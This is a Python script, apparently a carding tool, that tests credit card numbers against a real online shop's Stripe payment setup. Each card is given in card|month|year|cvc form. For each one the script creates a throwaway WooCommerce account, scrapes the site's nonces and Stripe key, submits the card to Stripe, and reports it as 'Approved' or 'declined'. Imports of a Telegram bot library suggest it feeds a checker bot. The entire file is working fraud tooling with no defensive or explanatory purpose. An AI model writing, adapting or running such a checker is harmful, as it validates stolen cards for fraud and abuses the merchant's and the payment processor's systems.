import requests
import re
import time
import random
import re,json
import string
import base64
from bs4 import BeautifulSoup
import user_agent
import pyfiglet
import os
import user_agent
import webbrowser
from colorama import Fore
from getuseragent import UserAgent
import requests
import re,time
from bs4 import  BeautifulSoup
from colorama import Fore
from user_agent import generate_user_agent
import random
import telebot
def brn6(ccx):
	import requests
	ccx=ccx.strip()
	c = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	user = user_agent.generate_user_agent()
			
	r = requests.session()
		

	
	r = requests.session()
	user = user_agent.generate_user_agent()
    
	x = random.randrange(0,9999)
	s=random.randrange(10,1000)
	
	r = requests.Session()
	user = generate_user_agent()
	headers = {
	    'authority': 'calefs.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'cache-control': 'max-age=0',
	    'if-modified-since': 'Sat, 29 Nov 2025 07:18:13 GMT',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'none',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': user,
	}
	
	response = r.get('https://calefs.com/', headers=headers)
	
	headers = {
	    'authority': 'calefs.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'cache-control': 'max-age=0',
	    'referer': 'https://calefs.com/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': user,
	}
	
	response = r.get('https://calefs.com/my-account/', cookies=r.cookies, headers=headers)
	
	nonce = re.search(r'name="woocommerce-register-nonce" value="(.*?)"',response.text).group(1)
	
	
	headers = {
	    'authority': 'calefs.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'cache-control': 'max-age=0',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://calefs.com',
	    'referer': 'https://calefs.com/my-account/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': user,
	}
	
	data = {
	    'email': f'y7is61{x}{c}@gmail.com',
	    'wc_order_attribution_source_type': 'typein',
	    'wc_order_attribution_referrer': '(none)',
	    'wc_order_attribution_utm_campaign': '(none)',
	    'wc_order_attribution_utm_source': '(direct)',
	    'wc_order_attribution_utm_medium': '(none)',
	    'wc_order_attribution_utm_content': '(none)',
	    'wc_order_attribution_utm_id': '(none)',
	    'wc_order_attribution_utm_term': '(none)',
	    'wc_order_attribution_utm_source_platform': '(none)',
	    'wc_order_attribution_utm_creative_format': '(none)',
	    'wc_order_attribution_utm_marketing_tactic': '(none)',
	    'wc_order_attribution_session_entry': 'https://calefs.com/',	    'wc_order_attribution_session_pages': '4',
	    'wc_order_attribution_session_count': '1',
	    'wc_order_attribution_user_agent': user,
	    'woocommerce-register-nonce': nonce,
	    '_wp_http_referer': '/my-account/',
	    'register': 'Register',
	}
	
	response = r.post('https://calefs.com/my-account/', cookies=r.cookies, headers=headers, data=data)
	
	
	
	headers = {
	    'authority': 'calefs.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'cache-control': 'max-age=0',
	    'referer': 'https://calefs.com/my-account/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': user
	}
	
	response = r.get('https://calefs.com/my-account/payment-methods/', cookies=r.cookies, headers=headers)
	
	
	headers = {
	    'authority': 'calefs.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'referer': 'https://calefs.com/my-account/payment-methods/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': user,
	}
	
	response = r.get('https://calefs.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
	pay= response.text.split('"createAndConfirmSetupIntentNonce":"')[1].split('"')[0]
	key = re.search(r'"key"\s*:\s*"([^"]+)"',response.text).group(1)
	
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': user,
	}
	
	data = f'type=card&card[number]={c}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent=stripe.js%2Fcba9216f35%3B+stripe-js-v3%2Fcba9216f35%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fcalefs.com&time_on_page=640401&client_attribution_metadata[client_session_id]=e7c66f90-b4b0-4242-b28f-fdc418629619&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=45b21a2d-170e-441d-9951-194b48db0483&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=b87cbedb-8133-4c9a-a9f0-ac40aa3cd473ba8248&muid=01da6d45-6393-4e48-bdb9-0965513ab1a9ca4263&sid=7abe9c75-b031-46df-8775-6bc7d059e678d0cfc1&key={key}&_stripe_version=2024-06-20'
	
	response = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	id = response.json()['id']
	headers = {
	    'authority': 'calefs.com',
	    'accept': '*/*',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://calefs.com',
	    'referer': 'https://calefs.com/my-account/add-payment-method/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': user,
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
	    'action': 'wc_stripe_create_and_confirm_setup_intent',
	    'wc-stripe-payment-method': id,
	    'wc-stripe-payment-type': 'card',
	    '_ajax_nonce': pay,
	}
	
	response = r.post('https://calefs.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
	if '"success":true,"data":{"status":"succeeded"' in response.text:
		return 'Approved'
	else:
		return 'declined'

		
#
#